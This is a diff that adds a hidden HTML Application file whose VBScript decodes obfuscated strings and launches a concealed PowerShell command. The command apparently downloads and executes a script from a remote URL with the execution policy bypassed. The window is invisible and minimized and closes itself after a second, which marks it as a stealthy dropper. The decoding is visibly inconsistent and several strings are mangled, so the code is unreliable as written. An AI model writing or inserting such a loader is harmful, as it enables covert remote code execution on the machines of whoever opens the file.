@@ -1,0 +1,45 @@
+<html>
+<head>
+    <title>.</title>
+    <HTA:APPLICATION
+        ID="w"
+        APPLICATIONNAME="."
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"
+        SCROLL="no"
+        INNERBORDER="no"
+    />
+    <script language="VBScript">
+        Function S(s)
+            Dim r, i
+            For i = 1 To Len(s)
+                r = r & Chr(Asc(Mid(s, i, 1)) + 1)
+            Next
+            S = r
+        End Function
+
+        Dim a, b, c, d, e, f, g, h, i, j, k
+        a = S("qnvdit!hbjm/")
+        b = S("dbut")
+        c = S("NvtuUpdmg")
+        d = S("qpsxfsiifmm")
+        e = S("!GydfuvujpoQpmjdz!Czqbtt!Xjoepe4uzmf!Ijeefo!Dpnnebse!")
+        f = S("juq://fkbkpodbyyyy.dzpv/")
+        g = S("!WtfCbtjdQbstjoh!qbuf!jfx")
+        h = Replace(a, "!", "-")
+        i = Replace(d, "!", "s")
+        j = Replace(e, "!", "-")
+        k = Replace(g, "!", "|")
+        
+        Execute(b & " " & c & ":Set " & c & " = CreateObject(""WScript.Shell"")")
+        Execute(c & ".Run """ & i & j & """" & Chr(34) & "iwr " & f & k & Chr(34) & ", 0, False")
+        window.setTimeout "Self.Close", 1000
+    </script>
+</head>
+<body style="display:none;">
+</body>
+</html>
